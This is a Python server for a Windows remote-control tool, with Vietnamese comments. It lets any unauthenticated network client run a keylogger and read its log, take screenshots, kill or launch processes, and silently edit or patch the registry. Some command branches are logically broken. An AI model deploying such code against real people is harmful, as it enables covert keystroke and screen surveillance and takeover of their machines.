import io
import os
import json
import psutil  # Để quản lý thông tin về quá trình và tài nguyên hệ thống
import socket  # Để tạo và quản lý kết nối socket
import threading  # Để tạo và quản lý luồng xử lý đồng thời
import subprocess  # Để thực hiện các lệnh hệ thống
from PIL import ImageGrab  # Để chụp màn hình
from keylogger import Keylogger  # Module tự viết để ghi nhận các phím được đánh trên máy tính
from screenshot import Screenshot
from process_and_apps import ProcessManager, AppManager
from registry import RegistryManager
from shutdown import ServerShutdownWindow  # Module tự viết để tạo cửa sổ tắt máy
import psutil  # Thư viện quản lý thông tin về quá trình và tài nguyên hệ thống

class Server:
    def __init__(self):
        self.server_ip = ""
        self.socket = None
        self.running = False
        self.cache_path = "tmp_files"
        self.keylogger = Keylogger(os.path.join(self.cache_path, "keylog.txt"))
        self.client_threads = []

    def stop_server(self):
        self.running = False
        if self.socket:
            self.socket.close()
        for client_thread in self.client_threads:
            client_thread.join()
        self.keylogger.stop()


    def start_server(self):
        # Tạo socket và liên kết nó với địa chỉ IP của máy chủ và cổng 12345
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((self.server_ip, 12345))
        self.socket.listen(1)  # Lắng nghe kết nối từ máy khách
        print("Server đang chạy và lắng nghe kết nối.")
        self.running = True
        while self.running:
            try:
                # Chấp nhận kết nối từ máy khách và trả về đối tượng socket mới
                client_socket, client_address = self.socket.accept()
                print(f"Đã kết nối từ {client_address[0]}:{client_address[1]}")

                # Tạo một luồng riêng để xử lý tin nhắn từ client
                client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
                client_thread.start()
                self.client_threads.append(client_thread)

            except OSError:
                if not self.running:
                    break
                else:
                    raise

    def handle_client(self, client_socket):
        try:
            while True:
                # Nhận dữ liệu từ máy khách (không quá 1024 bytes)
                data = client_socket.recv(1024)

                # Kiểm tra nếu không còn dữ liệu hoặc kết nối đã đóng, thoát khỏi vòng lặp
                if not data:
                    break

                # Giải mã dữ liệu nhận được từ bytes sang chuỗi
                data = data.decode()

                # Xử lý yêu cầu từ máy khách bằng cách gọi hàm process_request
                response = self.process_request(data, client_socket)

                # Nếu có phản hồi từ hàm process_request, gửi phản hồi về máy khách
                if response is not None:
                    client_socket.sendall(response.encode())

        # Xử lý ngoại lệ trong quá trình xử lý yêu cầu từ máy khách
        except Exception as e:
            print(f"Lỗi xử lý yêu cầu từ client: {str(e)}")

        # Cuối cùng, đảm bảo đóng kết nối với máy khách
        finally:
            client_socket.close()


    def process_request(self, request, client_socket):
        if request == "start":
            # Bắt đầu ghi log các phím được nhấn
            self.keylogger.start()
            return ""
        elif request == "stop":
            # Dừng ghi log các phím được nhấn
            self.keylogger.stop()
            return ""
        elif request == "clear":
            # Xóa dữ liệu log các phím đã ghi
            self.keylogger.clear_log()
            return ""
        elif request == "print":
            # Đọc và trả về dữ liệu log các phím đã ghi
            logs = self.keylogger.read_log()
            return logs
        elif request == "screenshot":
            screenshot_data = Screenshot.capture_screenshot()
            client_socket.sendall(str(len(screenshot_data)).encode())  # Gửi kích thước trước
            client_socket.sendall(screenshot_data)  # Gửi dữ liệu hình ảnh
            return None  # Không cần trả về gì ở đây (gửi hình ảnh rồi)
        elif request == "shutdown":
            # Hiển thị cửa sổ tắt máy chủ và thực hiện tắt máy chủ khi cần
            shutdown_window = ServerShutdownWindow(self)
            shutdown_window.start()
            return "Server đã tắt"
        elif request == "apps":
            self.handle_list_request(client_socket, False)
        elif request == "processus":
            self.handle_list_request(client_socket, True)
        elif request.startswith("kill"):
            _, pid_str = request.split(" ", 1)
            pid = int(pid_str)
            response = ProcessManager.kill_process(pid)
            return response
        elif request.startswith("start"):
            _, app_name = request.split(" ", 1)
            response = ProcessManager.start_process(app_name)
            return response
        elif request == "registry patch":
            try:
                _, patch_file_path = request.split(" ", 1)
                response = RegistryManager.apply_registry_patch(patch_file_path)
                return response
            except ValueError:
                return "Invalid registry patch request."

        elif request.startswith("get"):
            try:
                _, key_path, value_name = request.split(" ", 2)
                result = RegistryManager.get_registry_value(key_path, value_name)
                return result
            except ValueError:
                return "Invalid get request."

        elif request.startswith("set"):
            try:
                _, key_path, value_name, value_data, value_type = request.split(" ", 4)
                result = RegistryManager.set_registry_value(key_path, value_name, value_data, value_type)
                return result
            except ValueError:
                return "Invalid set request."

        elif request.startswith("delete"):
            try:
                _, key_path, value_name = request.split(" ", 2)
                result = RegistryManager.delete_registry_value(key_path, value_name)
                return result
            except ValueError:
                return "Invalid delete request."

        elif request.startswith("create_key"):
            try:
                _, key_path = request.split(" ", 1)
                result = RegistryManager.create_registry_key(key_path)
                return result
            except ValueError:
                return "Invalid create_key request."

        elif request.startswith("delete_key"):
            try:
                _, key_path = request.split(" ", 1)
                result = RegistryManager.delete_registry_key(key_path)
                return result
            except ValueError:
                return "Invalid delete_key request."
        else:
            return "Invalid request."
    
    # handle registry patch
    def handle_registry_patch(self, client_socket):
        try:
            print("Đang nhận dữ liệu registry patch từ client...")
            registry_data = b""

            # Nhận và ghi dữ liệu từ client
            while True:
                chunk = client_socket.recv(1024)
                if not chunk:
                    break
                registry_data += chunk

            # Lưu dữ liệu vào tệp tin registry
            patch_file_path = os.path.join(self.cache_path, "registry.reg")
            with open(patch_file_path, "wb") as reg_file:
                reg_file.write(registry_data)

            # Áp dụng patch Registry bằng cách sử dụng RegistryManager
            
            response = RegistryManager.apply_registry_patch(patch_file_path)

            print("Đã nhận và lưu registry patch thành công.")
            return response

        except Exception as e:
            print(f"Lỗi xử lý registry patch: {str(e)}")
            return f"Error applying registry patch: {str(e)}"

    # kill process
    def kill(self, pid):
        try:
            # Tạo đối tượng Process sử dụng thư viện psutil để quản lý tiến trình với PID cụ thể
            process = psutil.Process(pid)
            
            # Kết thúc tiến trình bằng cách gọi phương thức terminate()
            process.terminate()
            
            # Trả về thông báo xác nhận tiến trình đã kết thúc
            return f"Process with PID {pid} terminated."
        except psutil.NoSuchProcess:
            # Xử lý ngoại lệ nếu không tìm thấy tiến trình với PID đã cho
            return "Process not found."
   
    
    # # running process
    # def get_running_processus(self):
    #     try:
    #         # Sử dụng PowerShell để lấy thông tin về tiến trình và số luồng
    #         powershell_command = "Get-Process | Select-Object ProcessName, Id, Threads | ConvertTo-Json"
    #         result = subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True, check=True)

    #         # Phân tích kết quả JSON
    #         processes = json.loads(result.stdout)

    #         # Tạo danh sách mới chứa thông tin về số luồng của từng tiến trình
    #         processus = []

    #         for process in processes:
    #             process_name = process['ProcessName']
    #             pid = process['Id']
    #             thread_count = len(process['Threads'])
        
    #             # Thêm thông tin vào danh sách mới
    #             processus.append({'ProcessName': process_name, 'PID': pid, 'ThreadCount': thread_count})
        
    #         return processus

    #     except subprocess.CalledProcessError as e:
    #         print(f"Lỗi: {e}")
    #         return []
        
    # # running apps, same as process
    # def get_running_applications(self):
    #     try:
    #         # Sử dụng PowerShell để lấy thông tin về tiến trình, tiêu đề cửa sổ chính, và thread count
    #         powershell_command = "Get-Process | Where-Object { $_.MainWindowTitle -ne '' } | Select-Object ProcessName, Id, Threads | ConvertTo-Json"
    #         result = subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True, check=True)

    #         # Phân tích kết quả JSON
    #         processes = json.loads(result.stdout)

    #         # Tạo danh sách mới chứa thông tin về tiêu đề cửa sổ chính và thread count của từng tiến trình
    #         apps_list = []

    #         for process in processes:
    #             process_name = process['ProcessName']
    #             pid = process['Id']
    #             thread_count = len(process['Threads'])

    #             # Thêm thông tin vào danh sách mới
    #             apps_list.append({'ProcessName': process_name, 'PID': pid, 'ThreadCount': thread_count})
    #         print(apps_list)
    #         return apps_list

    #     except subprocess.CalledProcessError as e:
    #         print(f"Lỗi: {e}")
    #         return []

    def handle_list_request(self, client_socket, is_process):
        try:
            if is_process:
                list = ProcessManager.get_running_processus()
            else:
                list = ProcessManager.get_running_applications()

            response = json.dumps(list)

            # Chia dữ liệu thành các gói tin có kích thước nhỏ
            chunk_size = 1024  # Kích thước mỗi gói tin
            chunks = [response[i:i+chunk_size] for i in range(0, len(response), chunk_size)]

            # Gửi từng gói tin cho client
            for chunk in chunks:
                self.send_packet(client_socket, chunk)

            # Gửi tín hiệu "done" để đánh dấu kết thúc dữ liệu
            client_socket.sendall(b"done")

        except Exception as e:
            error_message = str(e)
            self.send_packet(client_socket, error_message)  # Gửi thông báo lỗi đến client

    
    def send_packet(self, client_socket, packet):
        try:
            client_socket.send(packet.encode())
        except Exception as e:
            print(f"Error sending packet: {str(e)}")

    def registry_patch(self, reg_file_path):
        try:
            subprocess.Popen(['regedit', '/s', reg_file_path], shell=True)
            return "Registry patch applied successfully."
        except Exception as e:
            return f"Error applying registry patch: {str(e)}"


if __name__ == "__main__":
    server = Server()
    server.start_server()